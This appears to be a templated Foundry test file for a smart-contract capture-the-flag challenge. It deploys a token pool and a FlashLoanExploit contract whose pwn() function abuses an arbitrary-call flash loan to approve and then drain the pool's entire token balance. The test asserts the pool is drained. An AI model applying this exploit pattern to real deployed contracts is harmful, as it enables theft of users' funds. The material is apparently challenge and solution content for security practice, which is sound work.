// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "../challenges/{challenge_folder}/{main_contract}.sol";
import "../challenges/{challenge_folder}/Token.sol";

contract {test_contract_name} is Test {{
    {target_contract} public target;
    {token_contract} public token;
    FlashLoanExploit public exploit;
    
    uint256 constant POOL_BALANCE = {pool_balance};

    function setUp() public {{
        token = new {token_contract}();
        target = new {target_contract}(address(token));
        token.mint(address(target), POOL_BALANCE);
        exploit = new FlashLoanExploit(address(target), address(token));
    }}

    function testExploit() public {{
        assertEq(token.balanceOf(address(target)), POOL_BALANCE, "Pool should have tokens");
        assertEq(token.balanceOf(address(exploit)), 0, "Exploit should start empty");
        
        exploit.pwn();
        
        assertEq(token.balanceOf(address(target)), 0, "Pool should be drained");
        assertEq(token.balanceOf(address(exploit)), POOL_BALANCE, "Exploit should have tokens");
    }}
}}

contract FlashLoanExploit {{
    {target_contract} public pool;
    {token_contract} public token;
    
    constructor(address _pool, address _token) {{
        pool = {target_contract}(_pool);
        token = {token_contract}(_token);
    }}
    
    function pwn() external {{
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                bal
            )
        );
        token.transferFrom(address(pool), address(this), bal);
    }}
    
    receive() external payable {{}}
}}